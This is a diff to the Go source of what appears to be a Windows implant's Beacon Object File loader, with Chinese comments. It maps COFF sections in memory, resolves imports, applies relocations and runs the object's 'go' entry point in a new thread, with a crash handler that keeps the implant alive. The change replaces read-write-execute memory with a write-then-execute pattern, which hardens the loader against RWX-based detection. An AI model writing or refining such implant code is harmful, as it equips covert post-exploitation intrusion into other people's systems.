@@ -1,4 +1,4 @@
-//go:build windows && !light
+//go:build windows && !light && bof
 
 package main
 
@@ -258,6 +258,8 @@ func loadBOF(dataB64 string, args string) (output string, exitCode int32, errOut
 	}
 
 	// 4. Allocate memory for each section and copy data
+	//    先以 RW（可写**不可执行**）申请：段数据拷贝、IAT 槽填充、重定位都在这阶段
+	//    完成，全部写完后再按段属性收紧保护（见下方 protectBOFSections）。
 	sectionBases := make([]uintptr, hdr.NumberOfSections)
 	for i, sh := range sections {
 		secSize := sh.SizeOfRawData
@@ -267,7 +269,7 @@ func loadBOF(dataB64 string, args string) (output string, exitCode int32, errOut
 		if secSize == 0 {
 			secSize = 4096
 		}
-		base, err := windows.VirtualAlloc(0, uintptr(secSize), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+		base, _, err := allocRW(uintptr(secSize))
 		if err != nil {
 			cleanupSections(sectionBases[:i])
 			return "", -1, fmt.Sprintf("VirtualAlloc failed for section %d: %v", i, err)
@@ -294,11 +296,13 @@ func loadBOF(dataB64 string, args string) (output string, exitCode int32, errOut
 	// 7. Find "go" entry point
 	var entryPoint uintptr
 	var foundEntry bool
+	entrySection := -1
 	for i, sym := range symbols {
 		name := symbolNames[i]
 		if name == "go" || name == "_go" {
 			if sym.SectionNumber > 0 && sym.SectionNumber <= int16(hdr.NumberOfSections) {
 				entryPoint = sectionBases[sym.SectionNumber-1] + uintptr(sym.Value)
+				entrySection = int(sym.SectionNumber) - 1
 				foundEntry = true
 				break
 			}
@@ -306,6 +310,12 @@ func loadBOF(dataB64 string, args string) (output string, exitCode int32, errOut
 	}
 	if !foundEntry {
 		return "", -1, "BOF has no 'go' entry point"
+	}
+
+	// 7.5 段内容与重定位都已写入完毕，现在收紧保护：可执行段 → RX，数据段 → RW。
+	//     绝不保留 RWX（写入阶段用的是 RW，不存在"可写可执行"窗口）。
+	if perr := protectBOFSections(sections, sectionBases, entrySection); perr != nil {
+		return "", -1, fmt.Sprintf("protect BOF sections failed: %v", perr)
 	}
 
 	// 8. Prepare arguments and call entry point
@@ -705,6 +715,46 @@ func applyRelocations(sections []coffSectionHeader, sectionBases []uintptr,
 	return ""
 }
 
+// ─── 段保护收紧（去除 RWX）────────────────────────────────────────────────────
+
+// COFF 段属性位（IMAGE_SCN_MEM_EXECUTE）。
+const coffScnMemExecute = 0x20000000
+
+// protectBOFSections 在段数据、IAT 槽与重定位全部写完之后收紧段内存保护：
+//
+//   - 含 IMAGE_SCN_MEM_EXECUTE 的段（以及入口点所在段，兼容个别未标执行位的
+//     COFF）→ PAGE_EXECUTE_READ(RX)；
+//   - 其余段（.data/.rdata/.bss 等）→ PAGE_READWRITE(RW)，BOF 运行期的全局变量
+//     读写仍然正常。
+//
+// 申请阶段用的是 PAGE_READWRITE，因此整条链路上不存在 RWX。
+// 注意：若某段同时声明"可写 + 可执行"（运行期自改代码的 BOF），这里仍只给 RX，
+// 即宁可让该段在运行期不可写，也不申请 RWX —— 见报告"未改的 RWX 例外/限制"。
+func protectBOFSections(sections []coffSectionHeader, bases []uintptr, entrySection int) error {
+	for i, sh := range sections {
+		if i >= len(bases) || bases[i] == 0 {
+			continue
+		}
+		size := sh.SizeOfRawData
+		if sh.VirtualSize > size {
+			size = sh.VirtualSize
+		}
+		if size == 0 {
+			size = 4096
+		}
+		var err error
+		if sh.Characteristics&coffScnMemExecute != 0 || i == entrySection {
+			err = protectRX(bases[i], uintptr(size))
+		} else {
+			err = protectRW(bases[i], uintptr(size))
+		}
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
 // ─── Entry point calling ────────────────────────────────────────────────────
 
 // VEH crash protection: catches BOF thread crashes to keep implant alive.
@@ -798,13 +848,16 @@ func callEntryPoint(entryPoint uintptr, args []byte, argsLen int) (crashErr stri
 		0xC3,
 	)
 
-	tAddr, err := windows.VirtualAlloc(0, uintptr(len(thunkCode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	// thunk 页同样遵循 RW → 写 → RX：申请 RW、写入机器码，再改 RX 后才交给 CreateThread。
+	tAddr, _, err := allocRW(uintptr(len(thunkCode)))
 	if err != nil {
 		return fmt.Sprintf("VirtualAlloc thunk: %v", err)
 	}
 	defer windows.VirtualFree(tAddr, 0, windows.MEM_RELEASE)
 	copy((*[1 << 30]byte)(unsafe.Pointer(tAddr))[:len(thunkCode)], thunkCode)
+	if perr := protectRX(tAddr, uintptr(len(thunkCode))); perr != nil {
+		return fmt.Sprintf("protect thunk RX: %v", perr)
+	}
 
 	createThr := resolveAPI("kernel32.dll", "CreateThread")
 	waitObj := resolveAPI("kernel32.dll", "WaitForSingleObject")
